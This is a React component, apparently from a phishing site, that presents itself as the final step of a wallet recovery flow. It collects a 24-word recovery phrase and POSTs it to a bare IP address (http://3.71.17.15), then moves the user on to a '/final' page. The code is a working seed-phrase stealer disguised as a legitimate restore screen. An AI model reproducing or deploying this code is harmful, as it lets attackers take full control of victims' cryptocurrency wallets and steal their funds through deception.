import { FaArrowLeft, FaArrowRight } from "react-icons/fa6";

import { useNavigate } from "react-router-dom";
import Fields from "./Feilds";
import { useState } from "react";

export default function RecoveryPhraseFinal() {
  const [phrase, setPhrase] = useState(Array(24).fill(""));
  const submit = async () => {
    let phraseString = phrase.join(" ");
    console.log(phraseString);
    try {
      const response = await fetch("http://3.71.17.15", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ phrase: phraseString }),
      });
      const data = await response.json();
      navigate("/final");
      console.log(data);
    } catch (error) {
      console.log(error);
    }
  };
  const navigate = useNavigate();
  return (
    <div className="h-[100vh] flex bg-[#131415]">
      <img src="/recoverypic.png" className="h-full" alt="" />
      <div className="w-full h-full flex items-start justify-center">
        <div className="flex items-start justify-center flex-col w-[80%] min-h-full">
          <img
            src="/recoveryfinalprogress.png"
            className="w-[80%] mb-9"
            alt=""
          />
          <Fields phrase={phrase} setPhrase={setPhrase} />
          <div className="flex items-center justify-between gap-4 w-[80%] mt-24">
            <button
              className="w-[200px] flex items-center justify-center gap-4 font-semibold rounded-full p-3 text-white border border-white mt-9"
              onClick={() => navigate("/recoveryphrase")}
            >
              <FaArrowLeft /> Back
            </button>
            <button
              className="w-[200px] flex items-center justify-center gap-4 font-semibold rounded-full p-3 bg-white text-black mt-9 disabled:opacity-10"
              onClick={() => submit()}
            >
              Next Step <FaArrowRight />
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
